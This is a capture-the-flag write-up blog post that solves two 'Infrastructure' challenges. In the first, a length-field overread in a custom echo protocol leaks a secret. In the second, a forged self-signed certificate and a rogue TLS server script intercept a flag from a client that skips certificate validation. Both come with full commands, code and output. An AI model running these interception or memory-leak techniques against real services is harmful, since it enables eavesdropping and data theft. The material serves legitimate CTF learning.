---
layout: post
title:  "Infrastructure Challenges"
date:   2026-07-21 17:25:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /Athena-CTF-2026-Infrastructure/
---
* TOC
{:toc}

## Net Custom Protocol

Category: Infrastructure

Description: Reverse the custom echo protocol `(ECHO|k|foo)` over tcp and find a way to leak the secret. A player-facing transcript is provided; the service and secret are organizer-only.

```shell
nc 13.206.57.188 10027 -vv  
Connection to 13.206.57.188 10027 port [tcp/*] succeeded!  
ECHO|128|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
OK|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAathena{99HjSnAJgCmzBqBH}
```

`athena{99HjSnAJgCmzBqBH}`

___

## Net MITM TLS

Category: Infrastructure

Description: A background service in the target environment periodically transmits a secret flag over TLS to `https://net-mitm.local:4443/submit`. Connect to the shell service, set up a rogue TLS server with a forged certificate matching the expected domain hostname, and intercept the secret.

Connecting to the challenge server:
```shell
nc -v 13.206.57.188 10033  
Connection to 13.206.57.188 10033 port [tcp/*] succeeded!  
bash: cannot set terminal process group (13): Inappropriate ioctl for device  
bash: no job control in this shell  
player@ip-172-31-72-203:/app$ ls  
ls  
client_loop.py  entrypoint.sh  flag.txt  flag_replace.py
```

`client_loop.py`:
```shell
player@ip-172-31-72-203:/app$ cat client_loop.py  
cat client_loop.py  
#!/usr/bin/env python3
import time
import ssl
import socket

def get_cn(der_bytes):
    # OID for CommonName: 2.5.4.3 (\x06\x03\x55\x04\x03)
    oid = b'\x06\x03\x55\x04\x03'
    idx = der_bytes.find(oid)
    if idx == -1:
        return None
    try:
        val_idx = idx + 5
        tag = der_bytes[val_idx]
        length = der_bytes[val_idx + 1]
        if length & 0x80:
            len_bytes = length & 0x7f
            length = int.from_bytes(der_bytes[val_idx + 2 : val_idx + 2 + len_bytes], 'big')
            val_idx += len_bytes
        cn_bytes = der_bytes[val_idx + 2 : val_idx + 2 + length]
        return cn_bytes.decode('utf-8', errors='ignore')
    except:
        return None

def main():
    # Read the flag
    with open('flag.txt', 'r') as f:
        flag = f.read().strip()

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    while True:
        try:
            # Connect to net-mitm.local:4443
            with socket.create_connection(('net-mitm.local', 4443), timeout=3) as sock:
                with context.wrap_socket(sock, server_hostname='net-mitm.local') as ss:
                    # Verify CN
                    der_cert = ss.getpeercert(binary_form=True)
                    cn = get_cn(der_cert)
                    if cn == 'net-mitm.local':
                        # Send the flag
                        ss.sendall(f"POST /submit HTTP/1.1\r\nHost: net-mitm.local\r\nContent-Length: {len(flag)}\r\n\r\n{flag}".encode())
        except Exception as e:
            pass
        time.sleep(3)

if __name__ == '__main__':
    main()
```

`flag_replace.py`:
```shell
player@ip-172-31-72-203:/app$ cat flag_replace.py  
cat flag_replace.py
from pathlib import Path
import os

PLACEHOLDER = "placeholder_flag"

def replace_placeholder_flag(base_dir: Path) -> None:
    flag = os.environ.get("FLAG_FULL", "")
    if not flag:
        return

    script_path = Path(__file__).resolve()

    for path in base_dir.rglob("*"):
        if not path.is_file() or path.resolve() == script_path:
            continue

        try:
            content = path.read_text(encoding="utf-8")
        except (UnicodeDecodeError, OSError):
            continue

        if PLACEHOLDER not in content:
            continue

        path.write_text(content.replace(PLACEHOLDER, flag), encoding="utf-8")

    os.environ.pop("FLAG_FULL", None)

if __name__ == "__main__":
    replace_placeholder_flag(Path(__file__).resolve().parent)
```

Check the host name:
```shell
player@ip-172-31-72-203:/app$ cat /etc/hosts  
cat /etc/hosts  
127.0.0.1 localhost  
172.31.72.203 ip-172-31-72-203.ap-south-1.compute.internal  
127.0.0.1 net-mitm.local
```

Create a fake certificate:
```shell
player@ip-172-31-72-203:/app$ openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem -days 1 -nodes -subj "/CN=net-mitm.local"
```

Set up the rogue TLS server with the forged certificate:
```python
player@ip-172-31-72-203:/app$ cat > /tmp/mitm_server.py << 'EOF'  
import socket  
import ssl  
  
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)  
context.load_cert_chain(certfile='/tmp/cert.pem', keyfile='/tmp/key.pem')  
  
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.bind(('0.0.0.0', 4443))
    sock.listen(1)
    print("Listening on 4443...")
    conn, addr = sock.accept()
    with context.wrap_socket(conn, server_side=True) as ss:
        data = ss.recv(4096)
        body = data.split(b'\r\n\r\n', 1)[-1]
        print("Flag received:", body.decode())
EOF
```

Run the server:
```shell
python3 /tmp/mitm_server.py  
Listening on 4443...  
Flag received: athena{n3VPUOsY4XIKHq7y}  
player@ip-172-31-72-203:/app$ 
```

`athena{n3VPUOsY4XIKHq7y}`
